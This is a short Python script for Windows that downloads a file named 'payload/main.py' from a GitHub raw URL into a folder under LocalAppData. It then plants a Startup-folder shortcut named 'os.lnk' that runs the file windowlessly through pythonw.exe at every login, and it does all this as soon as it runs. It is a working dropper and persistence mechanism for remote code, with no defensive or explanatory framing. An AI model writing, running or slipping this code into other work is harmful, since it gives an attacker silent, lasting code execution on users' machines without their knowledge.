import os
import sys
import urllib.request
from win32com.client import Dispatch

def download_script(url, file_path):
    """Download the script from the URL and save it to the specified file path."""
    try:
        with urllib.request.urlopen(url) as response:
            content = response.read()
        with open(file_path, "wb") as file:
            file.write(content)
        print(f"Downloaded script to: {file_path}")
    except Exception as e:
        print(f"Failed to download script: {e}")
        sys.exit(1)

def add_to_startup():
    # Define paths
    startup_folder = os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
    path = os.path.join(startup_folder, "os.lnk")
    target = sys.executable.replace("python.exe", "pythonw.exe")
    wDir = os.path.join(os.environ["LOCALAPPDATA"], "gd")
    script_path = os.path.join(wDir, "main.py")
    icon = sys.executable

    # Ensure the working directory exists
    if not os.path.exists(wDir):
        os.makedirs(wDir)
        print(f"Created directory: {wDir}")

    # Download the script from the given URL
    script_url = "https://raw.githubusercontent.com/43a1723/test/refs/heads/main/payload/main.py"
    download_script(script_url, script_path)

    # Create a shortcut in the startup folder
    shell = Dispatch('WScript.Shell')
    shortcut = shell.CreateShortCut(path)
    shortcut.Targetpath = target
    shortcut.WorkingDirectory = wDir
    shortcut.IconLocation = icon
    shortcut.Arguments = f'"{script_path}"'
    shortcut.save()

add_to_startup()
print(os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs", "Startup"))
